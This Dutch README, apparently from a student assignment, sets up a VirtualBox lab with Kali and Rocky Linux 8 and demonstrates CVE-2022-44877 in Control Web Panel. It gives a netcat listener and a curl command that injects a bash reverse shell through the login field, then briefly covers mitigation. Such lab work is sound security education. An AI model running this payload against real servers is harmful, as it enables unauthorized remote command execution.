# Repo For NPE Cybersecurity Assignment

# Handleiding CVE-2022-44877

## Installeren VDI

Voordat je deze scripts uitvoert en u wilt geen foutmeldingen, download de VDI eerst.

### VDI Kali

Klik op deze [link](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-virtualbox-amd64.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u deze eerst unzippen. Hierna ga je naar de uitgepakte folder en verplaats je het .VDI bestand naar [VDI-folder](../src/VDI-folder/) in onze repo. Deze folder moet u nog aanmaken. Maak deze folder aan onder het mapje `src` (neem de naam letterlijk over, anders zal het script niet werken). Als u dit hebt gedaan, navigeert u naar onze GitHub repo (lokaal opgeslagen) en voert u het commando `tree` uit. Indien u dezelfde output krijgt als hieronder, is de folder correct aangemaakt.

```bash
C:.
└───src
    ├───Provisioning
    └───VDI-folder
```

### VDI Rocky 8

Klik op deze [link](https://techloudgeek.com/download/image/?link=https://dlconusc1.linuxvmimages.com/046389e06777452db2ccf9a32efa3760:dldatac/VirtualBox/R/rockylinux/8/RockyLinux_8.5_VBM.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u deze eerst unzippen. Hierna ga je naar de uitgepakte folder en verplaats je het .VDI bestand verplaatsen naar [onze VDI folder](./src/VDI-folder/) in onze repo.

> _Rocky Linux 8_ wordt gebruikt, omdat Enterprise Linux versies vanaf 9 deze exploit hebben gepatched.
> Andere _Red Hat Enterprise Linux 8_ gebasseerde besturingsystemen kunnen zoals _Almalinux 8_ en _CentOS 8_ **zouden** ook moeten werken met deze opstelling.

### Configuratie host-only adapter

We hebben een host-only adapter nodig voor onze opstelling. Om deze toe te voegen, opent u `VirtualBox`, gaat u naar de netwerk instellingen (linker balk 5de icoontje van boven te tellen). Klik op `aanmaken`. Nu gaan we onze adapter instellen volgens onze opstelling. Selecteer bij de tab `adapter` het bolletje `Handmatig adapter instellen`. Hier zetten we `IP-adres` op 192.168.100.1 en de `subnetmask` op 255.255.255.0. Dan gaan we naar de tab `DHCP-server`. Hier gaan we enkel `laatste-adres` aanpassen naar 192.168.100.100.

## Opzetten Virtuele Machines

Open een PowerShell venster waar je onze [GitHub repo](https://github.com/NickyCobbaert/Cybersecurity_NPE_Ni_Ru) hebt opgeslagen. Dan moet je naar onze [src-folder](./src/). Dit doe je in PowerShell met volgend commando `cd .\src\`. Nu zit u in onze folder van al onze scripts. Vanaf hier is het erg eenvoudig om alle scripts uit te voeren.

Om zeker te zijn dat uw versie van PowerShell correct is, voert u eerst volgend commando uit. Dat commando zorgt ervoor dat u PowerShell laat updaten naar de laatste versie.

```bash
winget update powershell
```

### Opzet Kali

Voer volgend commando uit in jouw PowerShell scherm:

```bash
& '.\Kali Linux.ps1'
```

### Aanpassen keyboard

Het default keyboard is `QWERTY`. Indien u wenst kan u het keyboard aanpassen.

Klik linksboven op het Kali logo. Typ dan `keyboard` in en klik enter. Klik op `LayOut` en disable `Use system defaults`. Dan klikt u linksonder op de `+Add`. Zoek naar `Belgian` en klik op `Ok`. Vervolgens klikt u op `English` en klik op `-Remove`.

#### Credentials

**username**=kali

**password**=kali

### Opzet Rocky

Voordat je het script uitvoert, kijk eerst eens in uw `known_hosts`. Als daar nog een regel staat met `127.0.0.1` of `localhost`, dan moet je deze verwijderen. known_hosts, bevindt zich onder het mapje `users`, dubbelklik op uw gebruiker, daarna zoekt u naar `.ssh` en dan zou u het bestand `known_hosts` moeten zien. Een voorbeeldje van een mogelijk pad vindt u hieronder.

```bash
C:\Users\ruben\.ssh\known_hosts
```

Voer volgend commando uit in jouw PowerShell scherm:

```bash
.\Rockylinux_NPE_N-R_init.ps1
```

**Opgepast:**

We hebben ons script zo gemaakt, dat u als gebruiker op `enter` moet duwen als de _Rocky Linux_ VM is opgestart. Je kan dit zien, als je de username & password moet ingeven. Je geeft deze in (credentials zie hieronder) en druk dan in je PowerShell venster op `enter`.

#### Credentials

**username**=rockylinux

**password**=rockylinux

# Hoe CVE-2022-44877 uitvoeren

## Open listener op Kali

```bash
nc -lvnp 4444
```

## Exploit uitvoeren vanaf Kali

- Surf naar de website van de _Rocky Linux_ en stuur alle output naar onze listener op _Kali_

```bash
curl --data-urlencode "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP_ROCKY$/login/index.php
```

**Merk op dat**:

- `$IP_KALI` = IP van de aanvaller (_Kali_)
- `$IP_ROCKY`= IP van de kwetsbare machine (_Rocky_)

> Het commando `bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1` wordt door onverwachte breaks `;` door de shell uitgevoerd om een reverse shell mogelijk te maken.
> Dit kan eventueel vervangen worden om andere commando's uit te voeren op de kwetsbare machine.

# Hoe sluit je de CVE uit?

De CVE kan worden weggewerkt door de poort van _cwp_ niet te laten routeren. Hierdoor heeft enkel het bedrijfsnetwerk toegang tot het dashboard (en de exploit). Zorg ervoor dat je goede _Access Control Lists_ hebt, zodat enkel de bevoegde gebruikers toegang hebben.

Uiteraard kan de exploit het makkelijkste verholpen worden door _CWP_ te updaten via dnf.
